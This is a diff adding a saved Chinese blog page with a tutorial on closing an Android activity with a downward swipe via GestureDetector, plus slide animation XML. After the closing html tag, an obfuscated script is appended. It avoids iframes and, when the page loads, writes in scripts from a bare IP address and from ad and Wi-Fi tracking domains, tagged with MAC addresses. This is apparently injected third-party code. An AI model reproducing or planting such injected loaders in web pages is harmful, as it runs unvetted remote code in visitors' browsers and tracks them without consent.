@@ -1,0 +1,266 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>android使用GestureDetector实现手势下滑关闭页面的效果。 - Andye - 博客园</title>
+<link type="text/css" rel="stylesheet" href="/bundles/blog-common.css?v=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1"/>
+<link id="MainCss" type="text/css" rel="stylesheet" href="/skins/LessIsMore/bundle-LessIsMore.css?v=0F7NKnmmVYJDCp-KQ2sA7Dn1GREfDmWWyNjiJP9YrzE1"/>
+<link id="mobile-style" media="only screen and (max-width: 768px)" type="text/css" rel="stylesheet" href="/skins/LessIsMore/bundle-LessIsMore-mobile.css?v=cQ0AaHqux6aS-vMMd5oSAg-U2pDq7j57NMONaWzYbBM1"/>
+<link title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cnblogs.com/yejiurui/rss"/>
+<link title="RSD" type="application/rsd+xml" rel="EditURI" href="http://www.cnblogs.com/yejiurui/rsd.xml"/>
+<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="http://www.cnblogs.com/yejiurui/wlwmanifest.xml"/>
+<script src="//common.cnblogs.com/script/jquery.js" type="text/javascript"></script>  
+<script type="text/javascript">var currentBlogApp = 'yejiurui', cb_enable_mathjax=false;var isLogined=false;</script>
+<script src="/bundles/blog-common.js?v=HjE8xh24aOra0V_HP38wxIHV3lfHC5polwLAK3mmjdg1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+		
+<!--done-->
+<div class="title"><a id="Header1_HeaderTitle" class="headermaintitle" href="http://www.cnblogs.com/yejiurui/">Andye</a></div>
+<div class="subtitle">停下休息的时候不要忘记别人还在奔跑!</div>
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li id="nav_sitehome"><a id="blog_nav_sitehome" class="menu" href="http://www.cnblogs.com/">博客园</a></li>
+<li id="nav_myhome"><a id="blog_nav_myhome" class="menu" href="http://www.cnblogs.com/yejiurui/">首页</a></li>
+<li id="nav_newpost"><a id="blog_nav_newpost" class="menu" rel="nofollow" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">新随笔</a></li>
+<li id="nav_contact"><a id="blog_nav_contact" class="menu" rel="nofollow" href="https://msg.cnblogs.com/send/Andye">联系</a></li>
+<li id="nav_rss"><a id="blog_nav_rss" class="menu" href="http://www.cnblogs.com/yejiurui/rss">订阅</a>
+<!--<a id="blog_nav_rss_image" class="aHeaderXML" href="http://www.cnblogs.com/yejiurui/rss"><img src="//www.cnblogs.com/images/xml.gif" alt="订阅" /></a>--></li>
+<li id="nav_admin"><a id="blog_nav_admin" class="menu" rel="nofollow" href="https://i.cnblogs.com/">管理</a></li>
+</ul>
+
+		<div class="blogStats">
+			
+			<div id="blog_stats">
+<!--done-->
+随笔-152&nbsp;
+文章-2&nbsp;
+评论-236&nbsp;
+</div>
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+	<div class = "post">
+		<h1 class = "postTitle">
+			<a id="cb_post_title_url" class="postTitle2" href="http://www.cnblogs.com/yejiurui/p/3803658.html">android使用GestureDetector实现手势下滑关闭页面的效果。</a>
+		</h1>
+		<div class="clear"></div>
+		<div class="postBody">
+			<div id="cnblogs_post_body"><p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实现类似Android风云直播手机端注册登录页，当手势向下滑动的时候，关闭页面的效果。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用GestureDetector来实现这个效果，当手势在屏幕上面滑动的时候 ，会掉用onFling方法，所以，在这个方法里面做判断和操作即可。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 好了 ，作为一个老程序员了，原理就不讲了，直接上代码，相信你会看懂的，有问题，直接留言或者联系我，我会第一时间回复的。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; （<span style="color: #ff0000;">今天感谢一个网友@奋斗 的反馈，由于我的失误，忘记把启动手势识别器的代码贴出来了，所以重新编辑了一下，感谢大家的支持！）</span></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 效果如下：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="http://images.cnitblog.com/blog/453160/201406/231118507525382.png"><img style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border: 0px;" title="image" src="http://images.cnitblog.com/blog/453160/201406/231118518616353.png" alt="image" width="287" height="492" border="0" /></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;一、实现手势下滑关闭功能。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.在onCreate方法里面重写 GestureDetector的方法</p>
+<div class="cnblogs_code" style="background-color: #f5f5f5; border: #cccccc 1px solid; padding: 5px;">
+<pre><span style="color: #0000ff;">private</span><span style="color: #000000;"> GestureDetector mGestureDetector;
+ @Override
+    </span><span style="color: #0000ff;">protected</span> <span style="color: #0000ff;">void</span><span style="color: #000000;"> onCreate(Bundle savedInstanceState) {
+        </span><span style="color: #0000ff;">super</span><span style="color: #000000;">.onCreate(savedInstanceState);
+        setContentView(R.layout.layout_login);
+     
+        mGestureDetector </span>= <span style="color: #0000ff;">new</span> GestureDetector(<span style="color: #0000ff;">this</span>, <span style="color: #0000ff;">new</span><span style="color: #000000;"> GestureDetector.SimpleOnGestureListener() {
+            @Override
+            </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span> onFling(MotionEvent e1, MotionEvent e2, <span style="color: #0000ff;">float</span> velocityX, <span style="color: #0000ff;">float</span><span style="color: #000000;"> velocityY) {
+                </span><span style="color: #008000;">//</span><span style="color: #008000;"> if (Math.abs(e1.getRawX() - e2.getRawX()) &gt; 250) {
+                </span><span style="color: #008000;">//</span> <span style="color: #008000;">//</span><span style="color: #008000;"> System.out.println("水平方向移动距离过大");
+                </span><span style="color: #008000;">//</span><span style="color: #008000;"> return true;
+                </span><span style="color: #008000;">//</span><span style="color: #008000;"> }</span>
+                <span style="color: #0000ff;">if</span> (Math.abs(velocityY) &lt; 100<span style="color: #000000;">) {
+                    </span><span style="color: #008000;">//</span><span style="color: #008000;"> System.out.println("手指移动的太慢了");</span>
+                    <span style="color: #0000ff;">return</span> <span style="color: #0000ff;">true</span><span style="color: #000000;">;
+                }
+
+                </span><span style="color: #008000;">//</span><span style="color: #008000;"> 手势向下 down</span>
+                <span style="color: #0000ff;">if</span> ((e2.getRawY() - e1.getRawY()) &gt; 200<span style="color: #000000;">) {
+                    finish();</span><span style="color: #008000;">//</span><span style="color: #008000;">在此处控制关闭</span>
+                    <span style="color: #0000ff;">return</span> <span style="color: #0000ff;">true</span><span style="color: #000000;">;
+                }
+                </span><span style="color: #008000;">//</span><span style="color: #008000;"> 手势向上 up</span>
+                <span style="color: #0000ff;">if</span> ((e1.getRawY() - e2.getRawY()) &gt; 200<span style="color: #000000;">) {
+                    </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">true</span><span style="color: #000000;">;
+                }
+                </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.onFling(e1, e2, velocityX, velocityY);
+            }
+        });
+
+    }</span></pre>
+</div>
+<p>&nbsp;&nbsp; 调用这句的代码启动手势识别器：</p>
+<p>&nbsp;&nbsp;</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:java;gutter:true;">     //2.让手势识别器 工作起来
+    //当activity被触摸的时候调用的方法.
+    @Override
+    public boolean onTouchEvent(MotionEvent event) {
+        mGestureDetector.onTouchEvent(event);
+        return super.onTouchEvent(event);
+    }
+    
+</pre>
+</div>
+<p>&nbsp;</p>
+<p>&nbsp; &nbsp;2.同样，如果你想要控制左滑和右滑，直接使用getRawX()方法即可，可以尝试。</p>
+<p>&nbsp;</p>
+<p>二、实现下拉和上抽动画效果。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 动画效果实现，重写上抽和下拉的动画效果，可以使用Android自带的一个方法，在finish()方法之前进行调用：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; overridePendingTransition(R.anim.slide_up_in, R.anim.slide_up_out);</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<p>R.anim.slide_up_out</p>
+<div class="cnblogs_code" style="background-color: #f5f5f5; border: #cccccc 1px solid; padding: 5px;">
+<pre>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;set xmlns:android="http://schemas.android.com/apk/res/android" &gt;
+
+    &lt;<span style="color: #000000;">translate
+        android:duration</span>="200"<span style="color: #000000;">
+        android:fromYDelta</span>="0%"<span style="color: #000000;">
+        android:interpolator</span>="@android:anim/accelerate_interpolator"<span style="color: #000000;">
+        android:toYDelta</span>="100%" /&gt;
+
+&lt;/set&gt;</pre>
+</div>
+<div class="cnblogs_code" style="background-color: #f5f5f5; border: #cccccc 1px solid; padding: 5px;">R.anim.slide_up_in:</div>
+<div class="cnblogs_code" style="background-color: #f5f5f5; border: #cccccc 1px solid; padding: 5px;">
+<pre>&lt;set xmlns:android="http://schemas.android.com/apk/res/android" &gt;
+
+    &lt;<span style="color: #000000;">translate
+        android:duration</span>="300"<span style="color: #000000;">
+        android:fromYDelta</span>="-100%"<span style="color: #000000;">
+        android:interpolator</span>="@android:anim/accelerate_interpolator"<span style="color: #000000;">
+        android:toYDelta</span>="0%" /&gt;
+
+&lt;/set&gt;</pre>
+</div>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 快去试试吧！</p></div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+
+
+		</div>
+		<div class = "postDesc">posted @ <span id="post-date">2014-06-23 11:19</span> <a href='http://www.cnblogs.com/yejiurui/'>Andye</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href ="https://i.cnblogs.com/EditPosts.aspx?postid=3803658" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(3803658);return false;">收藏</a></div>
+	</div>
+	<script type="text/javascript">var allowComments=true,cb_blogId=129651,cb_entryId=3803658,cb_blogApp=currentBlogApp,cb_blogUserGuid='f04b0286-1a0b-e211-aa3f-842b2b196315',cb_entryCreatedDate='2014/6/23 11:19:00';loadViewCount(cb_entryId);</script>
+	
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div id='comment_form' class='commentform'>
+<a name='commentform'></a>
+<div id='divCommentShow'></div>
+<div id='comment_nav'><span id='span_refresh_tips'></span><a href='javascript:void(0);' onclick='return RefreshCommentList();' id='lnk_RefreshComments' runat='server' clientidmode='Static'>刷新评论</a><a href='#' onclick='return RefreshPage();'>刷新页面</a><a href='#top'>返回顶部</a></div>
+<div id='comment_form_container'></div>
+<div class='ad_text_commentbox' id='ad_text_under_commentbox'></div>
+<div id='ad_t2'></div>
+<div id='opt_under_post'></div>
+<div id='ad_c1' class='c_ad_block'></div>
+<div id='under_post_news'></div>
+<div id='ad_c2' class='c_ad_block'></div>
+<div id='under_post_kb'></div>
+<div id='HistoryToday' class='c_ad_block'></div>
+<script type='text/javascript'>
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+
+
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+	<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+
+			<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+			</div>
+			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		
+<!--done-->
+Copyright &copy;2017 Andye
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1000205457'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1000205457%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
+<script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='b8:2a:72:c1:db:f9';
+var __m2='00:00:00:00:00:00';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=48c591bb0b2e4fd248d81fbb9360387b,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<20:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10270&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+case x>=20&&x<30:
+document.write(__h+"12"+__b);
+document.write("<sc"+"ript src=\"http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m+"\"></scr"+"ipt>");
+break;
+case x>=70&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?R6GpL99&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script>
